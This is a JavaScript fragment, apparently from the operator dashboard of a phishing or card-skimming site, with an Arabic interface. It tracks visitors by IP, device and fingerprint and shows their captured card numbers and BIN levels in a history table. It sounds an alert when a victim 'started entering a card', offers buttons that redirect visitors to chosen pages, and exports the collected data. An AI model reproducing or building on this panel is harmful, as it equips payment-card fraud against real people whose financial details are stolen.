  toast('info',{msg:name?`✅ تم حفظ الاسم: ${name}`:'✅ تم مسح الاسم'});
}

// ── Flash ──────────────────────────────────────────────────────────────────
function flashCard(id) {
  const el=document.getElementById('vc-'+id);
  if(el) { el.classList.add('card-flash'); setTimeout(()=>el.classList.remove('card-flash'),2000); }
}

// ── Stats ──────────────────────────────────────────────────────────────────
async function updateStats() {
  try {
    const r=await fetch(S+'/api/stats',{headers:{'x-auth-token':token}});
    const d=await r.json();
    document.getElementById('s-active').textContent=d.active||0;
    document.getElementById('s-total').textContent=d.total||0;
  } catch(e){}
}

// ── Filter ─────────────────────────────────────────────────────────────────
function applyFilter() {
  const q=document.getElementById('fsearch').value.toLowerCase();
  const st=document.getElementById('fstatus').value;
  document.querySelectorAll('.vcard').forEach(c=>{
    const id=c.id.replace('vc-','');
    const s=sessions[id]; if(!s) return;
    const text=((s.ip||'')+(s.deviceName||'')+(s.fpName||'')).toLowerCase();
    const online=s._online!==false;
    let show=true;
    if(q&&!text.includes(q)) show=false;
    if(st==='online'&&!online) show=false;
    if(st==='offline'&&online) show=false;
    if(starOn&&!s.starred) show=false;
    c.style.display=show?'':'none';
  });
}

function toggleStarFilter() {
  starOn=!starOn;
  document.getElementById('fstar-btn').classList.toggle('on',starOn);
  applyFilter();
}

// ── Tabs ───────────────────────────────────────────────────────────────────
function tab(name) {
  ['live','history','pages'].forEach(t=>{
    document.getElementById('tab-'+t).style.display=t===name?'':'none';
  });
  document.querySelectorAll('.tab').forEach((t,i)=>{
    t.classList.toggle('active',['live','history','pages'][i]===name);
  });
  if(name==='history') loadHistory();
  if(name==='pages') loadPages();
}

// ── History ────────────────────────────────────────────────────────────────
async function loadHistory() {
  const r=await fetch(S+'/api/sessions/history',{headers:{'x-auth-token':token}});
  const rows=await r.json();
  document.getElementById('htbody').innerHTML=rows.map(r=>`
    <tr>
      <td>${r.device_name||parseUA(r.user_agent||'')}</td>
      <td style="font-family:monospace;font-size:11px">${r.ip||'—'}</td>
      <td style="font-family:monospace">${r.card_data&&JSON.parse(r.card_data)?.number?fmtCard(JSON.parse(r.card_data).number):'—'}</td>
      <td>${r.bin_data&&JSON.parse(r.bin_data)?.level?JSON.parse(r.bin_data).level:'—'}</td>
      <td style="font-size:11px">${new Date(r.connected_at).toLocaleString('ar')}</td>
      <td style="font-weight:700;color:#7c3aed">${r.visit_count||1}</td>
      <td>${r.starred?'⭐':''}</td>
    </tr>`).join('');
}

function fmtCard(n) {
  return (n||'').replace(/(.{4})/g,'$1 ').trim();
}

// ── Pages ──────────────────────────────────────────────────────────────────
async function loadPages() {
  const r=await fetch(S+'/api/pages',{headers:{'x-auth-token':token}});
  const pages=await r.json();
  sitePages={};
  pages.forEach(p=>{ if(!sitePages[p.site]) sitePages[p.site]=[]; sitePages[p.site].push(p); });
  renderPagesGrid();
}

function renderPagesGrid() {
  const grid=document.getElementById('pages-grid'); if(!grid) return;
  const all=Object.values(sitePages).flat();
  if(!all.length) { grid.innerHTML='<div style="color:#bbb;font-size:13px;padding:20px">لا توجد صفحات بعد — ستظهر تلقائياً عند زيارة الموقع</div>'; return; }
  const favs=all.filter(p=>p.is_favorite), others=all.filter(p=>!p.is_favorite);
  let h='';
  if(favs.length) {
    h+=`<div style="grid-column:1/-1;font-size:12px;font-weight:700;color:#b45309;margin-bottom:4px">⭐ المفضلة — تظهر كأزرار ثابتة في بطاقة كل زائر</div>`;
    h+=favs.map(p=>pCard(p)).join('');
  }
  if(others.length) {
    h+=`<div style="grid-column:1/-1;font-size:12px;font-weight:700;color:#6b7280;margin-top:${favs.length?'12px':'0'};margin-bottom:4px">📄 باقي الصفحات — مخفية في بطاقة الزائر</div>`;
    h+=others.map(p=>pCard(p)).join('');
  }
  grid.innerHTML=h;
}

function pCard(p) {
  return `<div class="pcard${p.is_favorite?' fav':''}">
    <div class="pcard-top">
      <div style="min-width:0"><div class="pcard-title">${p.title||p.path}</div><div class="pcard-path">${p.path}</div></div>
      <button class="pfav-btn" onclick="toggleFav(${p.id},${p.is_favorite?0:1})" title="${p.is_favorite?'إزالة من المفضلة':'إضافة للمفضلة'}">${p.is_favorite?'⭐':'☆'}</button>
    </div>
    <div class="ptags">
      ${p.is_nav?'<span class="ptag" style="background:#dbeafe;color:#1d4ed8">🧭 رئيسية</span>':''}
      <span class="ptag" style="background:#f3f4f6;color:#6b7280">👁 ${p.visit_count}</span>
      <span class="ptag" style="background:#f3f4f6;color:#6b7280">🌐 ${shortSite(p.site)}</span>
    </div>
  </div>`;
}

async function toggleFav(id, fav) {
  await post(`/api/pages/${id}/favorite`,{favorite:fav});
  await loadPages();
  if(selId) refreshRedirButtons();
  toast('info',{msg:fav?'⭐ تمت الإضافة للمفضلة':'✓ تمت الإزالة'});
}

// ── Export ─────────────────────────────────────────────────────────────────
function exportXL() {
  window.open(`${S}/api/export?token=${encodeURIComponent(token)}`,'_blank');
}

// ── Toasts ─────────────────────────────────────────────────────────────────
function toast(type, data) {
  const panel=document.getElementById('alerts');
  const cfg={
    new:  {cls:'',     icon:'👤', title:'زائر جديد دخل',    sub:(data.deviceName||parseUA(data.userAgent||''))+' • '+(data.ip||'')},
    card: {cls:'card', icon:'🚨', title:'بدأ إدخال بطاقة!', sub:(data.deviceName||parseUA(data.userAgent||''))+' • '+(data.ip||''), sound:880},
    ret:  {cls:'ret',  icon:'🔄', title:`زائر عائد${data.fpName?' — '+data.fpName:''}`, sub:`زيارة #${data.visitCount||'?'} • ${data.ip||''}`},
    info: {cls:'',     icon:'✅', title:data.msg||'',        sub:''}
  };
  const c=cfg[type]||cfg.info;
  const el=document.createElement('div');
  el.className=`toast ${c.cls}`;
  el.innerHTML=`<div class="toast-icon">${c.icon}</div><div><div class="toast-title">${c.title}</div>${c.sub?`<div class="toast-sub">${c.sub}</div>`:''}</div>`;
  panel.insertBefore(el,panel.firstChild);
  if(c.sound) beep(c.sound); else beep(440);
  setTimeout(()=>el.remove(), type==='card'?8000:4000);
}

function beep(freq) {
  try {
    const ctx=new AudioContext(), o=ctx.createOscillator(), g=ctx.createGain();
    o.connect(g); g.connect(ctx.destination);
    o.frequency.value=freq; o.type='sine';
    g.gain.setValueAtTime(0.2,ctx.currentTime);
    g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.5);
    o.start(); o.stop(ctx.currentTime+0.5);
  } catch(e){}
}

// ── Helpers ────────────────────────────────────────────────────────────────
function parseUA(ua) {
  if(!ua) return 'Unknown';
  if(/iPhone/.test(ua)) return 'iPhone';
  if(/iPad/.test(ua)) return 'iPad';
  if(/Android/.test(ua)) return 'Android';
  if(/Macintosh/.test(ua)) return 'Mac';
  if(/Windows/.test(ua)) return 'Windows';
  return 'Browser';
}
function shortSite(s) { try { return new URL(s).hostname; } catch(e) { return s; } }
